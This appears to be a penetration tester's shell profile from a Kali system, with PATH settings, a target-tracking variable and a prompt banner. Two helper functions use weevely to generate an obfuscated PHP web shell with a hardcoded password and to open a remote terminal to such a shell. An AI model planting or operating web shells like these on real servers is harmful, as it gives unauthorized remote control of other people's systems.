
# Created by `userpath` on 2021-11-22 23:07:18
export PATH="$PATH:/home/kali/.local/bin"
export PATH=$PATH:/home/kali/Documents/scripts/

#PERMANENT VARIABLES

export function target(){
  export TARGET=$1
}


export function banner() {
  RED='\033[0;31m'
  GREEN='\033[0;32m'
  NC='\033[0m'
  ips=$(hostname -I | sed 's/ *$//')
  tgt=""
  if [[ ! -z $TARGET ]]; then tgt=T:[$TARGET]; fi
  add="${RED}$tgt ${GREEN}L:[$ips]"
  echo -e "$add${NC}"
}

export weevely-gen(){
  cmd="weevely generate adminpassword1234 shell.php -obfuscator obfusc1_php -agent obfpost_php"
  echo $cmd
  eval $cmd
}

export weevely-term(){
  cmd="weevely terminal $1 adminpassword1234"
  echo $cmd
  eval $cmd
}

#echo "profile loaded"
